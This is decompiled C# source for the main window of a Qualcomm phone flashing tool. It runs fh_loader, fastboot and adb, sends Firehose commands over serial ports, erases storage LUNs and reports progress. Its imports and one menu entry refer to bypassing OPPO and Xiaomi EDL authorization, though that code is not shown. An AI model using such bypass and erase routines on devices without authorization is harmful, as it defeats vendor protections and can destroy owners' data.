using Modal = AntdUI.Modal;
using StyleLine = AntdUI.Tabs.StyleLine;
using IStyle = AntdUI.Tabs.IStyle;
using JsonSerializer = System.Text.Json.JsonSerializer;
using Label = System.Windows.Forms.Label;
using Message = AntdUI.Message;
using TabPage = System.Windows.Forms.TabPage;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Button = System.Windows.Forms.Button;
using System.Xml;
using System.Xml.Linq;
using AntdUI;
using Auth_Skiper_QC;
using ChromeosUpdateEngine;
using LibUsbDotNet;
using LibUsbDotNet.Main;
using Mi_Auth_Qualcomm;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Ookii.Dialogs.WinForms;
using qc.Properties;
using qc.QcomTool.Sahara;
using QcomTool.Qcom.FIREHOSE;
using RlinQualcomm;
using ServerAuth;
using SLA_Challenge;
using Sunny.UI;
using TMF_ENt.AES;
using TMF_ENt.AES.HWID;
using TMF_ENt.Http;
using WinFormsPayload;
using XOUFS.Module;

namespace qc;

public class Form1 : Window
{
	private enum OpreationMain
	{
		WriteFlash,
		NetworkService,
		ReadFlash,
		Erase,
		ACC
	}

	private enum READPartition
	{
		ReadGPT,
		ReadPart,
		ErasePart,
		WritePart
	}

	public class FileData
	{
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private object _0;

		public string name
		{
			[CompilerGenerated]
			get
			{
				return (string)_0;
			}
			[CompilerGenerated]
			set
			{
				_0 = value;
			}
		}
	}

	public class Root
	{
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private IntPtr _0;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private object _1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private object _2;

		public int code
		{
			[CompilerGenerated]
			get
			{
				return (int)(nint)_0;
			}
			[CompilerGenerated]
			set
			{
				_0 = (IntPtr)value;
			}
		}

		public string message
		{
			[CompilerGenerated]
			get
			{
				return (string)_1;
			}
			[CompilerGenerated]
			set
			{
				_1 = value;
			}
		}

		public List<FileData> data
		{
			[CompilerGenerated]
			get
			{
				return (List<FileData>)_2;
			}
			[CompilerGenerated]
			set
			{
				_2 = value;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass115_0
	{
		public StringBuilder logBuilder;

		internal void _1(object s, DataReceivedEventArgs ev)
		{
			if (!string.IsNullOrEmpty(ev.Data))
			{
				logBuilder.AppendLine(ev.Data);
			}
		}

		internal void _2(object s, DataReceivedEventArgs ev)
		{
			if (!string.IsNullOrEmpty(ev.Data))
			{
				logBuilder.AppendLine(ev.Data);
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass117_0
	{
		public StringBuilder outputBuilder;

		internal void _1(object s, DataReceivedEventArgs ev)
		{
			if (!string.IsNullOrEmpty(ev.Data))
			{
				outputBuilder.AppendLine(ev.Data);
			}
		}

		internal void _2(object s, DataReceivedEventArgs ev)
		{
			if (!string.IsNullOrEmpty(ev.Data))
			{
				outputBuilder.AppendLine(ev.Data);
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass157_0
	{
		public int ConRes;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass157_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass157_0 CS_0024_003C_003E8__locals1;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass157_2
	{
		public string xml;

		public _003C_003Ec__DisplayClass157_1 CS_0024_003C_003E8__locals2;

		internal async Task _1()
		{
			nint num = await LinQcPortClass.SendCon(CS_0024_003C_003E8__locals2.SepSl, xml);
			CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass223_0
	{
		public JToken specialItem;

		internal bool _1(JToken d)
		{
			return d != specialItem;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass268_0
	{
		public Form1 _003C_003E4__this;

		public int timeoutSeconds;

		public Action _003C_003E9__2 = default;

		public Action _003C_003E9__3 = default;

		internal void _1()
		{
			((UICheckBox)_003C_003E4__this.m_cc).Checked = true;
		}

		internal void _2()
		{
			_003C_003E4__this._94("已停止等待端口\n");
			_003C_003E4__this.EnableButtons();
		}

		internal void _3()
		{
			_003C_003E4__this._94("找到端口: " + ((Control)_003C_003E4__this.m_126).Text + "\n");
			_003C_003E4__this.PortQcom = ((Control)_003C_003E4__this.m_126).Text;
			_003C_003E4__this.EnableButtons();
		}

		internal void _4()
		{
			_003C_003E4__this._94("未找到有效端口！\n");
			_003C_003E4__this.msgred();
			_003C_003E4__this.EnableButtons();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass268_1
	{
		public int i;

		public _003C_003Ec__DisplayClass268_0 CS_0024_003C_003E8__locals1;

		internal void _1()
		{
			CS_0024_003C_003E8__locals1._003C_003E4__this._94($"等待端口...{CS_0024_003C_003E8__locals1.timeoutSeconds - i} 秒");
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass275_0
	{
		public string selectedItem;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			if (selectedItem == "官方:OPPO-8gen2（Qualcomm 8gen2 Bypass Auth）")
			{
				_003C_003E4__this._39();
				return;
			}
			_003C_003E4__this.m_32 = new BackgroundWorker();
			((BackgroundWorker)_003C_003E4__this.m_32).WorkerSupportsCancellation = true;
			((BackgroundWorker)_003C_003E4__this.m_32).DoWork += _003C_003E4__this._22;
			((BackgroundWorker)_003C_003E4__this.m_32).RunWorkerAsync();
			((Component)_003C_003E4__this.m_32).Dispose();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass277_0
	{
		public TaskCompletionSource<bool> tcs;

		public Process process;

		internal void _1(object sender, EventArgs e)
		{
			tcs.SetResult(process.ExitCode == 0);
			process.Dispose();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass298_0
	{
		public Process process;

		internal void _1()
		{
			process.WaitForExit();
		}

		internal void _2()
		{
			process.WaitForExit();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass310_0
	{
		public int ConRes;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass310_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass310_0 CS_0024_003C_003E8__locals1;

		internal async Task _1()
		{
			nint num = await LinQcPortClass.SenndXmls(SepSl, firehose_pkts.EDL());
			CS_0024_003C_003E8__locals1.ConRes = (int)num;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass329_0
	{
		public Process process;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			if (process.ExitCode == 0)
			{
				_003C_003E4__this.c5(5u);
				return;
			}
			((RichTextBox)_003C_003E4__this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)_003C_003E4__this.m_c8).AppendText("Error\n");
			_003C_003E4__this.cb();
			_003C_003E4__this.cc();
			((Control)_003C_003E4__this.m_ed).Enabled = true;
			((Control)_003C_003E4__this.m_89).Enabled = true;
			((Control)_003C_003E4__this._88).Enabled = true;
			((Control)_003C_003E4__this.m_c2).Enabled = true;
			((Control)_003C_003E4__this.m_cb).Enabled = true;
			((TextBoxBase)_003C_003E4__this.m_c8).ScrollToCaret();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass329_1
	{
		public Exception ex;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			((RichTextBox)_003C_003E4__this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)_003C_003E4__this.m_c8).AppendText("执行magiskboot时出错: " + ex.Message + "\n");
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass337_0
	{
		public string partitionName;

		internal bool _1(DataGridViewRow r)
		{
			return !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(partitionName, StringComparison.OrdinalIgnoreCase);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass339_0
	{
		public string arguments;

		internal (bool, string) _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c \"C:\\TMFTool\\fh_loader.exe " + arguments + "\"",
					WorkingDirectory = "C:\\TMFTool",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				if (!string.IsNullOrEmpty(text2))
				{
					text = text + Environment.NewLine + "错误信息: " + text2;
				}
				return (process.ExitCode == 0, text);
			}
			catch (Exception ex)
			{
				return (false, "异常信息: " + ex.Message);
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass343_0
	{
		public string partitionName;

		internal bool _1(DataGridViewRow r)
		{
			return !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(partitionName, StringComparison.OrdinalIgnoreCase);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass344_0
	{
		public string partitionName;

		internal bool _1(DataGridViewRow r)
		{
			return !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(partitionName, StringComparison.OrdinalIgnoreCase);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass348_0
	{
		public string arguments;

		internal (bool, string) _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c \"fh_loader.exe " + arguments + "\"",
					WorkingDirectory = "C:\\TMFTool",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				if (!string.IsNullOrEmpty(text2))
				{
					text = text + Environment.NewLine + "错误信息: " + text2;
				}
				return (process.ExitCode == 0, text);
			}
			catch (Exception ex)
			{
				return (false, "异常信息: " + ex.Message);
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass390_0
	{
		public int lastPercent;

		public long totalBytes;

		public DateTime lastTime;

		public long lastBytes;

		public Form1 _003C_003E4__this;

		internal async Task _1(StreamReader reader, bool isError)
		{
			while (true)
			{
				string text;
				object line = (text = await reader.ReadLineAsync());
				if (text == null)
				{
					break;
				}
				object CS_0024_003C_003E8__locals14 = new _003C_003Ec__DisplayClass390_1();
				((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1 = this;
				((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent = (int)_003C_003E4__this._104(line);
				if (((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent < 0 || ((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent == lastPercent)
				{
					continue;
				}
				lastPercent = ((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent;
				long num = (long)((double)(totalBytes * ((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent) / 100.0);
				DateTime now = DateTime.Now;
				double totalSeconds = (now - lastTime).TotalSeconds;
				if (totalSeconds > 0.15)
				{
					object CS_0024_003C_003E8__locals12 = new _003C_003Ec__DisplayClass390_2();
					((_003C_003Ec__DisplayClass390_2)CS_0024_003C_003E8__locals12).CS_0024_003C_003E8__locals2 = (_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14;
					long num2 = num - lastBytes;
					((_003C_003Ec__DisplayClass390_2)CS_0024_003C_003E8__locals12).speedMBs = (double)num2 / 1048576.0 / totalSeconds;
					((Control)_003C_003E4__this.m_cd).BeginInvoke((Delegate)(Action)(() =>
					{
						((Control)((_003C_003Ec__DisplayClass390_2)CS_0024_003C_003E8__locals12).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.m_cd).Text = $"{((_003C_003Ec__DisplayClass390_2)CS_0024_003C_003E8__locals12).speedMBs:F2} MB/s";
					}));
					lastTime = now;
					lastBytes = num;
				}
				((Control)_003C_003E4__this.m_c1).BeginInvoke((Delegate)(Action)(() =>
				{
					((UIProcessBar)((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = Math.Min(((_003C_003Ec__DisplayClass390_1)CS_0024_003C_003E8__locals14).percent, 100);
				}));
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass390_1
	{
		public int percent;

		public _003C_003Ec__DisplayClass390_0 CS_0024_003C_003E8__locals1;

		internal void _1()
		{
			((UIProcessBar)CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = Math.Min(percent, 100);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass390_2
	{
		public double speedMBs;

		public _003C_003Ec__DisplayClass390_1 CS_0024_003C_003E8__locals2;

		internal void _1()
		{
			((Control)CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.m_cd).Text = $"{speedMBs:F2} MB/s";
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass392_0
	{
		public int percent;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			((UIProcessBar)_003C_003E4__this.m_c1).Value = Math.Min(percent, ((UIProcessBar)_003C_003E4__this.m_c1).Maximum);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass395_0
	{
		public long lastReadBytes;

		public DateTime lastTime;

		public long lastBytesForSpeed;

		public string filename;

		public long totalBytes;

		public Form1 _003C_003E4__this;

		internal async Task _1(StreamReader reader)
		{
			while (true)
			{
				string text;
				object input = (text = await reader.ReadLineAsync());
				if (text == null)
				{
					break;
				}
				object obj = Regex.Match((string)input, ":\\s*(\\d+)\\s*/\\s*\\?");
				if (!((Group)obj).Success || !long.TryParse(((Match)obj).Groups[1].Value, out var result) || result == lastReadBytes)
				{
					continue;
				}
				object CS_0024_003C_003E8__locals14 = new _003C_003Ec__DisplayClass395_1();
				((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1 = this;
				lastReadBytes = result;
				DateTime now = DateTime.Now;
				double totalSeconds = (now - lastTime).TotalSeconds;
				if (totalSeconds > 0.15)
				{
					object CS_0024_003C_003E8__locals10 = new _003C_003Ec__DisplayClass395_2();
					((_003C_003Ec__DisplayClass395_2)CS_0024_003C_003E8__locals10).CS_0024_003C_003E8__locals2 = (_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14;
					long num = result - lastBytesForSpeed;
					((_003C_003Ec__DisplayClass395_2)CS_0024_003C_003E8__locals10).speedMBs = (double)num / 1048576.0 / totalSeconds;
					((Control)_003C_003E4__this.m_cd).BeginInvoke((Delegate)(Action)(() =>
					{
						((Control)((_003C_003Ec__DisplayClass395_2)CS_0024_003C_003E8__locals10).CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.m_cd).Text = $"{((_003C_003Ec__DisplayClass395_2)CS_0024_003C_003E8__locals10).speedMBs:F2} MB/s";
					}));
					lastTime = now;
					lastBytesForSpeed = result;
				}
				double num2 = result;
				object obj2 = "B";
				if (num2 >= 1024.0)
				{
					num2 /= 1024.0;
					obj2 = "KB";
				}
				if (num2 >= 1024.0)
				{
					num2 /= 1024.0;
					obj2 = "MB";
				}
				if (num2 >= 1024.0)
				{
					num2 /= 1024.0;
					obj2 = "GB";
				}
				if (num2 >= 1024.0)
				{
					num2 /= 1024.0;
					obj2 = "TB";
				}
				((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).displayText = $"读取分区 {filename}: {num2:F2} {obj2}/{_003C_003E4__this._16b(totalBytes)}";
				((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).progressValue = 0;
				if (totalBytes > 0)
				{
					double num3 = (double)result * 1.0 / (double)totalBytes;
					((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).progressValue = Math.Min(10000, (int)(num3 * 10000.0));
				}
				((Control)_003C_003E4__this.m_cf).BeginInvoke((Delegate)(Action)(() =>
				{
					((Control)((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this.m_cf).Text = ((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).displayText;
					((UIProcessBar)((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = ((_003C_003Ec__DisplayClass395_1)CS_0024_003C_003E8__locals14).progressValue;
				}));
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass395_1
	{
		public string displayText;

		public int progressValue;

		public _003C_003Ec__DisplayClass395_0 CS_0024_003C_003E8__locals1;

		internal void _1()
		{
			((Control)CS_0024_003C_003E8__locals1._003C_003E4__this.m_cf).Text = displayText;
			((UIProcessBar)CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = progressValue;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass395_2
	{
		public double speedMBs;

		public _003C_003Ec__DisplayClass395_1 CS_0024_003C_003E8__locals2;

		internal void _1()
		{
			((Control)CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.m_cd).Text = $"{speedMBs:F2} MB/s";
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass404_0
	{
		public Action<int> onProgress;

		internal void _1(object s, DownloadProgressChangedEventArgs e)
		{
			onProgress(e.ProgressPercentage);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass405_0
	{
		public string adbPath;

		public string arguments;

		internal string _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = adbPath,
					Arguments = arguments,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				using StreamReader streamReader = process.StandardOutput;
				string text = streamReader.ReadToEnd();
				process.WaitForExit();
				return text.Trim();
			}
			catch (Exception ex)
			{
				return "命令执行失败: " + ex.Message;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass469_0
	{
		public Process process;

		internal void _1()
		{
			process.WaitForExit();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass475_0
	{
		public string OP;

		public string flashCommand;

		public Form1 _003C_003E4__this;

		internal bool _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = OP + " " + flashCommand,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = new Process
				{
					StartInfo = startInfo
				};
				bool shouldDisplayOutput = flashCommand.Contains("super") || flashCommand.Contains("system") || flashCommand.Contains("userdata");
				DataReceivedEventHandler value = (object sender, DataReceivedEventArgs e) =>
				{
					if (!string.IsNullOrEmpty(e.Data))
					{
						if (e.Data.StartsWith("Sending sparse"))
						{
							string pattern = "Sending sparse\\s+'(\\w+)'\\s+(\\d+/\\d+)\\s+\\(([\\d\\s]+) KB\\)";
							Match match = Regex.Match(e.Data, pattern);
							if (match.Success)
							{
								string value2 = match.Groups[1].Value;
								string value3 = match.Groups[2].Value;
								string value4 = match.Groups[3].Value;
								if (long.TryParse(value4.Trim(), out var result))
								{
									long num = (long)Math.Round((double)result / 1024.0);
									string displayText = $"刷写分段文件 sparse {value3} ({num} MB)";
									if (((Control)_003C_003E4__this.m_cf).InvokeRequired)
									{
										((Control)_003C_003E4__this.m_cf).Invoke((Delegate)(Action)(() =>
										{
											((Control)_003C_003E4__this.m_cf).Text = displayText;
										}));
									}
									else
									{
										((Control)_003C_003E4__this.m_cf).Text = displayText;
									}
								}
							}
						}
						if (e.Data.Contains("FAILED"))
						{
							_003C_003E4__this.msgred();
							_003C_003E4__this.Msg(e.Data + "\n");
						}
						else if (!shouldDisplayOutput)
						{
						}
					}
				};
				process.OutputDataReceived += value;
				process.ErrorDataReceived += value;
				process.Start();
				process.BeginOutputReadLine();
				process.BeginErrorReadLine();
				process.WaitForExit();
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				_003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass476_0
	{
		public string flashCommand;

		public Form1 _003C_003E4__this;

		internal bool _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = (flashCommand ?? ""),
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit();
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				if (process.ExitCode != 0)
				{
					_003C_003E4__this.msgred();
					_003C_003E4__this.Msg(text2 ?? "");
				}
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				_003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass477_0
	{
		public string flashCommand;

		public Form1 _003C_003E4__this;

		internal bool _1()
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "C:\\TMFTool\\fastboot.exe",
					Arguments = "erase " + flashCommand + "\"",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit();
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				if (process.ExitCode != 0)
				{
					_003C_003E4__this.msgred();
					_003C_003E4__this.Msg(text2 ?? "");
				}
				return process.ExitCode == 0;
			}
			catch (Exception ex)
			{
				_003C_003E4__this.Msg("执行时出错: " + ex.Message);
				return false;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass48_0
	{
		public string msg;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			AntdUI.Modal.open((Form)(object)_003C_003E4__this, msg, "错误", (TType)4);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass501_0
	{
		public string filePath;

		public Form1 _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass501_1
	{
		public long readBytes;

		public long totalBytes;

		public _003C_003Ec__DisplayClass501_0 CS_0024_003C_003E8__locals1;

		public Action _003C_003E9__2 = default;

		internal string _1()
		{
			using FileStream fileStream = File.OpenRead(CS_0024_003C_003E8__locals1.filePath);
			using SHA256 sHA = SHA256.Create();
			byte[] array = new byte[1048576];
			int num;
			while ((num = fileStream.Read(array, 0, array.Length)) > 0)
			{
				sHA.TransformBlock(array, 0, num, null, 0);
				readBytes += num;
				((Control)(object)CS_0024_003C_003E8__locals1._003C_003E4__this).Invoke((Delegate)(Action)(() =>
				{
					double num2 = (double)readBytes * 100.0 / (double)totalBytes;
					((UIProcessBar)CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = Math.Min((int)(readBytes * 10000 / totalBytes), 10000);
					((Control)CS_0024_003C_003E8__locals1._003C_003E4__this.m_cf).Text = $"校验进度: {num2:F2}%";
				}));
			}
			sHA.TransformFinalBlock(Array.Empty<byte>(), 0, 0);
			return Convert.ToBase64String(sHA.Hash);
		}

		internal void _2()
		{
			double num = (double)readBytes * 100.0 / (double)totalBytes;
			((UIProcessBar)CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Value = Math.Min((int)(readBytes * 10000 / totalBytes), 10000);
			((Control)CS_0024_003C_003E8__locals1._003C_003E4__this.m_cf).Text = $"校验进度: {num:F2}%";
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass510_0
	{
		public Process process;

		internal void _1()
		{
			process.WaitForExit();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass514_0
	{
		public bool isFailed;

		public Form1 _003C_003E4__this;

		public bool headerPrinted;

		public string name;

		internal void _1(object sender, DataReceivedEventArgs e)
		{
			if (string.IsNullOrEmpty(e.Data))
			{
				return;
			}
			string data = e.Data;
			if (data.ToLower().Contains("failed") || data.ToLower().Contains("error"))
			{
				isFailed = true;
				_003C_003E4__this.msgred();
				_003C_003E4__this._173("\n" + data);
				return;
			}
			Match match = Regex.Match(data, "Sending sparse '([^']+)' (\\d+)/(\\d+)");
			if (match.Success)
			{
				string value = match.Groups[1].Value;
				int num = int.Parse(match.Groups[2].Value);
				int num2 = int.Parse(match.Groups[3].Value);
				if (num == 1)
				{
					headerPrinted = true;
				}
				_003C_003E4__this._171($"[Payload] 刷写 {value} Sparse [{num}/{num2}]...");
			}
			else if (!headerPrinted)
			{
				_003C_003E4__this._171("[Payload] 刷写 " + name + " ...");
				headerPrinted = true;
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass514_1
	{
		public Process process;

		internal void _1()
		{
			process.WaitForExit();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass518_0
	{
		public Form1 _003C_003E4__this;

		public DateTime lastTime;

		public long lastWritten;

		public string exportDir;

		public Progress<(long writtenBytes, long totalBytes, string message)> progress;

		public Progress<string> logProgress;

		public bool autoThreads;

		public int maxThreads;

		public Action<string> _003C_003E9__3 = default;

		internal void _1(string msg)
		{
			_003C_003E4__this.Msg(msg);
		}

		internal void _2((long writtenBytes, long totalBytes, string message) p)
		{
			((Control)_003C_003E4__this.m_cf).Text = p.message;
			DateTime now = DateTime.Now;
			double totalSeconds = (now - lastTime).TotalSeconds;
			if (totalSeconds >= 0.2)
			{
				long num = Math.Max(0L, p.writtenBytes - lastWritten);
				double bytesPerSecond = (double)num / totalSeconds;
				((Control)_003C_003E4__this.m_cd).Text = (string)(_003C_003E4__this._17a(bytesPerSecond) ?? "");
				lastWritten = p.writtenBytes;
				lastTime = now;
			}
			if (p.totalBytes > 0)
			{
				((UIProcessBar)_003C_003E4__this.m_c1).Value = Math.Min((int)(p.writtenBytes * 10000 / p.totalBytes), 10000);
			}
		}

		internal void _3(string msg)
		{
			((IProgress<string>)logProgress).Report(msg);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass518_1
	{
		public string partitionName;

		public _003C_003Ec__DisplayClass518_0 CS_0024_003C_003E8__locals1;

		internal Task<Payload.PayloadExtractionException> _1()
		{
			return ((Payload)CS_0024_003C_003E8__locals1._003C_003E4__this.m_7f).ExtractAsync(partitionName, CS_0024_003C_003E8__locals1.exportDir, false, ((Checkbox)CS_0024_003C_003E8__locals1._003C_003E4__this.m_16d).Checked, (IProgress<(long writtenBytes, long totalBytes, string message)>)CS_0024_003C_003E8__locals1.progress, (Action<string>)((string msg) =>
			{
				((IProgress<string>)CS_0024_003C_003E8__locals1.logProgress).Report(msg);
			}), CS_0024_003C_003E8__locals1.autoThreads, CS_0024_003C_003E8__locals1.maxThreads);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass51_0
	{
		public string msg;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			Message.error((Form)(object)_003C_003E4__this, "注意:尝试重新链接服务器失败:" + msg, (Font)null, (int?)null);
		}

		internal void _2()
		{
			AutoCloseMessageBox.Show("服务器链接丢失:" + msg, 3000);
			((Control)(object)_003C_003E4__this).Hide();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass524_0
	{
		public string UFS;

		public int ConRes;

		public Form1 _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass524_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass524_0 CS_0024_003C_003E8__locals1;

		internal async Task _1()
		{
			if (CS_0024_003C_003E8__locals1.UFS == "4096")
			{
				nint num = 0;
				while (num <= 5)
				{
					nint num2 = await LinQcPortClass.ERasexml(xml: string.Format(Firehose.ERASE, CS_0024_003C_003E8__locals1.UFS, (int)num), SePort: SepSl);
					CS_0024_003C_003E8__locals1.ConRes = (int)num2;
					if (CS_0024_003C_003E8__locals1.ConRes == 1)
					{
						CS_0024_003C_003E8__locals1._003C_003E4__this.Msg($"擦除LUN{(int)num}...");
						CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
						CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
						int num3 = (int)num;
